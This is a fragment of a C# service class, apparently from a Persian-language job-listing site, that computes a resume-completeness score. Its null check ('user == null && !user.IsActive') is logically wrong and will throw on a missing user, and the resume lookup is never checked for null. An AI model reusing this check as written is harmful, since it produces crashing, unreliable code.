                return (false, "مشکلی رخ داده است", null);
            }


            //var ticketCount = await _context.Tickets.Where().CountAsync();
            //ViewBag.EmployeeCount = await _context.Users.Where(x => x.Role == PublicHelper.EmployeeRole).CountAsync();
            //ViewBag.EmployerCount = await _context.Users.Where(x => x.Role == PublicHelper.EmployeeRole).CountAsync();
            //ViewBag.TicketCount = ticketCount;
            //ViewBag.AdverCount = await _context.JobAdvertisements.CountAsync();
            //ViewBag.OrdersCount = await _context.Payments.CountAsync();
            //ViewBag.FactorsCount = await _context.Factors.CountAsync();
        }
        public ResomeCompeleteLevel GetResomePercent(List<Resome> resomes, string userId)
        {
            var user = new User();

            user = _context.Users.FirstOrDefault(x => x.Id == userId);
            if (user == null && !user.IsActive)
            {
                return null;
            }


            var resomeId = user.ResomeId;
            var resome = resomes
                .FirstOrDefault(x => x.Id == resomeId);
            var finalModel = new ResomeCompeleteLevel()
            {
                aboutMe = string.IsNullOrEmpty(resome.AboutMe) ? 6 : 0,
                EducationalBackgroundId = resome.EducationalBackgrounds.Count == 0 ? 15 : 0,
                UserJobPreferencesId = resome.UserJobPreferencesId == null ? 20 : 0,
                UserLanguageId = resome.UserLanguages.Count == 0 ? 12 : 0,
                UserJobSkillId = resome.UserJobSkills.Count == 0 ? 12 : 0,
                UserWorkExperienceId = resome.UserWorkExperiences.Count == 0 ? 15 : 0,
            };
            if (string.IsNullOrEmpty(user.Military))
            {
                finalModel.checkUserInfo = 0;
            }
            finalModel.CompeletePercent = finalModel.GetCompeletePercent();

            return finalModel;
        }
    }
}

